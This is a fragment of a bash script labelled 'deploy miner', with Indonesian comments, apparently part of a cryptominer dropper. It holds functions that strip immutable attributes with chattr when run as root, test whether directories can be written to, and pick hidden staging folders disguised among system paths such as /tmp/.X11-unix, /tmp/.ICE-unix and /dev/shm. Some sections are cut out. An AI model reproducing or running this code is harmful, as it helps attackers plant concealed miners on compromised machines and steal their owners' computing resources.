#!/usr/bin/env bash
# deploy miner — tahan /tmp ketat, HOME aneh, gak ada wget/curl salah satu
...
trymk(){ b="$1";d="$(dirname "$b")";[ -d "$d" ]||return 1;[ -w "$d" ]||return 1;have chattr&&[ "$(id -u)" = 0 ]&&chattr -R -i "$b" 2>/dev/null;mkdir -p "$b" 2>/dev/null;[ -d "$b" ]||return 1;[ -w "$b" ]||return 1;touch "$b/.wtest" 2>/dev/null||return 1;rm -f "$b/.wtest" 2>/dev/null;echo "$b";return 0; }
...
pick3(){ for b in /var/tmp/.d3 /dev/shm/.d "$HOME/.d3" /tmp/.ICE-unix/.d /tmp/.X11-unix/.d;do trymk "$b"&&return;done; }
ST="$(pick3)/.s"
